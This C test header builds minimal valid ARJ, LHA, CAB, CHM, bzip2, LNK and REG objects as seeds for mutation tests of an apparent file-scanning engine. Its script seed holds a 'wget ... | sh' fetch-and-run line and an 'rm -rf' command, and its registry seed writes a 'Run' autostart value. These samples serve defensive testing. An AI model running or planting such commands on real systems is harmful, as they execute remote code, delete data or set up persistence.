/*
 * hostile_engine_seeds.h - minimal VALID objects of the formats seeds.h does not
 * build (ARJ, LHA, CAB, CHM, bzip2, LNK, REG), written with the test-local
 * writer of hostile_engine.h.
 *
 * Valid is the point: a hostile test starts from an object the parser accepts, so
 * that truncating it or changing a byte is what makes it hostile - and so that a
 * parser that has stopped accepting its own format shows up as a failed sniff
 * before any mutation is tried.
 */

#ifndef KOFENG_TEST_HOSTILE_ENGINE_SEEDS_H
#define KOFENG_TEST_HOSTILE_ENGINE_SEEDS_H

#include "hostile_engine.h"
#include "../../libkofeng/kofcore/kofcore.h"

/* ARJ: the archive header (a file header of type 2), a stored file, a coded one,
 * and the zero-length end header. */
static inline void hs_arj_hdr(struct he_w *w, uint8_t method, uint8_t ftype,
			      const char *name, const void *body, uint32_t blen)
{
	enum { FIRST = 30 };
	uint32_t nl = (uint32_t)strlen(name) + 1u, basic = FIRST + nl + 1u;

	he_u8(w, 0x60);
	he_u8(w, 0xea);
	he_u16(w, basic);
	he_u8(w, FIRST);
	he_u8(w, 11);
	he_u8(w, 1);
	he_u8(w, 2);
	he_u8(w, 0);
	he_u8(w, method);
	he_u8(w, ftype);
	he_zero(w, 5);
	he_u32(w, blen);
	he_u32(w, blen);
	he_zero(w, 10);
	he_put(w, name, nl);
	he_u8(w, 0);
	he_u32(w, 0);
	he_u16(w, 0);
	he_put(w, body, blen);
}

static inline void hs_arj(struct he_w *w)
{
	static const char body[] = "kofeng-arj-fixture-body";

	hs_arj_hdr(w, 0, 2, "archive.arj", NULL, 0);
	hs_arj_hdr(w, 0, 0, "stored.txt", body, (uint32_t)sizeof body - 1u);
	hs_arj_hdr(w, 1, 0, "coded.bin", body, 8);
	he_u8(w, 0x60);
	he_u8(w, 0xea);
	he_u16(w, 0);
}

/* LHA level 0 headers: a stored entry, a coded one, the end mark. */
static inline void hs_lha_entry(struct he_w *w, const char *method, const char *name,
				const void *body, uint32_t blen)
{
	uint32_t nl = (uint32_t)strlen(name), hsize = 20u + nl + 2u, sum = 0, i;
	uint8_t h[300];

	memset(h, 0, sizeof h);
	h[0] = (uint8_t)hsize;
	memcpy(h + 2, method, 5);
	kof_st_le32(h + 7, blen);
	kof_st_le32(h + 11, blen);
	h[19] = 0x20;
	h[20] = 0;
	h[21] = (uint8_t)nl;
	memcpy(h + 22, name, nl);
	for (i = 0; i < hsize; i++)
		sum += h[2 + i];
	h[1] = (uint8_t)sum;
	he_put(w, h, 2u + hsize);
	he_put(w, body, blen);
}

static inline void hs_lha(struct he_w *w)
{
	static const char body[] = "kofeng-lha-fixture-body";

	hs_lha_entry(w, "-lh0-", "stored.txt", body, (uint32_t)sizeof body - 1u);
	hs_lha_entry(w, "-lh5-", "coded.bin", body, 8);
	he_u8(w, 0);
}

/* CAB: two stored blocks in folder 0, one MSZIP block in folder 1, three files. */
static inline void hs_cab(struct he_w *w)
{
	enum { BLK = 16, FILES_AT = 36 + 16 };
	uint8_t blk[BLK];
	uint32_t i, total, data0, data1;
	size_t base = w->n;
	static const struct { const char *name; uint32_t size, off; uint16_t folder; } f[3] = {
		{ "small.txt", 8, 0, 0 }, { "split.bin", 16, 8, 0 }, { "coded.bin", 10, 0, 1 }
	};
	uint32_t files_len = 0;

	for (i = 0; i < 3; i++)
		files_len += 16u + (uint32_t)strlen(f[i].name) + 1u;
	data0 = FILES_AT + files_len;
	data1 = data0 + 2u * (8u + BLK);
	total = data1 + 8u + 10u;
	for (i = 0; i < BLK; i++)
		blk[i] = (uint8_t)('A' + i);
	he_str(w, "MSCF");
	he_u32(w, 0);
	he_u32(w, total);
	he_u32(w, 0);
	he_u32(w, FILES_AT);
	he_u32(w, 0);
	he_u16(w, 0x0301);
	he_u16(w, 2);
	he_u16(w, 3);
	he_u16(w, 0);
	he_u16(w, 0);
	he_u16(w, 0);
	he_u32(w, data0);
	he_u16(w, 2);
	he_u16(w, 0);
	he_u32(w, data1);
	he_u16(w, 1);
	he_u16(w, 1);
	for (i = 0; i < 3; i++) {
		he_u32(w, f[i].size);
		he_u32(w, f[i].off);
		he_u16(w, f[i].folder);
		he_u16(w, 0);
		he_u16(w, 0);
		he_u16(w, 0x20);
		he_put(w, f[i].name, strlen(f[i].name) + 1u);
	}
	for (i = 0; i < 2; i++) {
		he_u32(w, 0);
		he_u16(w, BLK);
		he_u16(w, BLK);
		he_put(w, blk, BLK);
	}
	he_u32(w, 0);
	he_u16(w, 10);
	he_u16(w, 10);
	he_put(w, blk, 10);
	(void)base;
}

/* CHM: header, directory header, one directory chunk with one entry, the content. */
static inline void hs_chm(struct he_w *w)
{
	enum { CHUNK = 4096, ITSF = 0x60, ITSP = 0x54, DIR_AT = ITSF + ITSP, CONTENT = DIR_AT + CHUNK };
	static const char page[] = "<html>kofeng chm fixture page</html>";
	uint8_t chunk[CHUNK], *at;
	uint32_t nl = 9;

	he_str(w, "ITSF");
	he_u32(w, 3);
	he_u32(w, ITSF);
	he_zero(w, 8);
	he_u32(w, 0x409);
	he_zero(w, 32);
	he_u64(w, ITSF);
	he_u64(w, 0x18);
	he_u64(w, ITSF);
	he_u64(w, ITSP);
	he_u64(w, CONTENT);
	he_str(w, "ITSP");
	he_u32(w, 1);
	he_u32(w, ITSP);
	he_zero(w, 4);
	he_u32(w, CHUNK);
	he_zero(w, 24);
	he_u32(w, 1);
	he_zero(w, ITSP - 48u);
	memset(chunk, 0, sizeof chunk);
	memcpy(chunk, "PMGL", 4);
	at = chunk + 0x14;
	*at++ = (uint8_t)nl;
	memcpy(at, "/page.htm", nl);
	at += nl;
	*at++ = 0;
	*at++ = 0;
	*at++ = (uint8_t)(sizeof page - 1u);
	chunk[4] = (uint8_t)(CHUNK - (uint32_t)(at - chunk));
	chunk[5] = (uint8_t)((CHUNK - (uint32_t)(at - chunk)) >> 8);
	he_put(w, chunk, sizeof chunk);
	he_put(w, page, sizeof page - 1u);
}

/* bzip2: the stream header and the end-of-stream mark of an empty stream. */
static inline void hs_bz2(struct he_w *w)
{
	static const uint8_t b[] = { 'B', 'Z', 'h', '9', 0x17, 0x72, 0x45, 0x38, 0x50, 0x90, 0, 0, 0, 0 };

	he_put(w, b, sizeof b);
}

/* LNK: a shell link header with no link-target list, no info, no strings. */
static inline void hs_lnk(struct he_w *w)
{
	static const uint8_t clsid[16] = { 0x01, 0x14, 0x02, 0, 0, 0, 0, 0,
					   0xc0, 0, 0, 0, 0, 0, 0, 0x46 };

	he_u32(w, 0x4c);
	he_put(w, clsid, sizeof clsid);
	he_u32(w, 0);
	he_u32(w, 0x20);
	he_zero(w, 76u - 4u - 16u - 8u);
}

/* REG: a text registry export. */
static inline void hs_reg(struct he_w *w)
{
	he_str(w, "Windows Registry Editor Version 5.00\r\n\r\n"
		  "[HKEY_CURRENT_USER\\Software\\Kofeng]\r\n"
		  "\"Run\"=\"C:\\\\x.exe\"\r\n"
		  "\"Dword\"=dword:00000001\r\n");
}

/* ---- the seed table: one valid object per parser that has a magic -------------------- */

#include "seeds.h"
#include <kofmod/kofsig.h>

#define SEEDS 19u

struct seed {
	const char *name;
	uint8_t     fmt;
	uint8_t    *p;
	size_t      n;
};

static struct seed seeds[SEEDS];
static unsigned n_seeds;

static inline void add_seed(const char *name, uint8_t fmt, const uint8_t *p, size_t n)
{
	uint8_t *c = malloc(n ? n : 1u);

	if (!c || n_seeds >= SEEDS)
		return;
	memcpy(c, p, n);
	seeds[n_seeds].name = name;
	seeds[n_seeds].fmt = fmt;
	seeds[n_seeds].p = c;
	seeds[n_seeds].n = n;
	n_seeds++;
}

typedef uint64_t (*seed_fn)(uint8_t *);

static inline void add_big(const char *name, uint8_t fmt, seed_fn f)
{
	uint8_t *b = calloc(1, SEED_MAX);

	if (!b)
		return;
	add_seed(name, fmt, b, (size_t)f(b));
	free(b);
}

static inline void add_w(const char *name, uint8_t fmt, void (*f)(struct he_w *))
{
	struct he_w w = { 0 };

	f(&w);
	add_seed(name, fmt, w.p, w.n);
	he_free(&w);
}

static inline void build_seeds(void)
{
	static const char script[] = "#!/bin/sh\nwget http://x/y -O- | sh\nrm -rf /tmp/x\n";

	add_big("elf", KOF_FMT_ELF, seed_elf);
	add_big("pe", KOF_FMT_PE, seed_pe);
	add_big("zip", KOF_FMT_ZIP, seed_zip);
	add_big("tar", KOF_FMT_TAR, seed_tar);
	add_big("gzip", KOF_FMT_GZIP, seed_gzip);
	add_big("7z", KOF_FMT_7Z, seed_7z);
	add_big("rar", KOF_FMT_RAR, seed_rar);
	add_big("xz", KOF_FMT_XZ, seed_xz);
	add_big("docole", KOF_FMT_DOCOLE, seed_docole);
	add_big("pdf", KOF_FMT_PDF, seed_pdf);
	add_big("rtf", KOF_FMT_RTF, seed_rtf);
	add_w("arj", KOF_FMT_ARJ, hs_arj);
	add_w("lha", KOF_FMT_LHA, hs_lha);
	add_w("cab", KOF_FMT_CAB, hs_cab);
	add_w("chm", KOF_FMT_CHM, hs_chm);
	add_w("bz2", KOF_FMT_BZIP2, hs_bz2);
	add_w("lnk", KOF_FMT_LNK, hs_lnk);
	add_w("reg", KOF_FMT_REG, hs_reg);
	add_seed("script", KOF_FMT_SCRIPT, (const uint8_t *)script, sizeof script - 1u);
}


#endif /* KOFENG_TEST_HOSTILE_ENGINE_SEEDS_H */
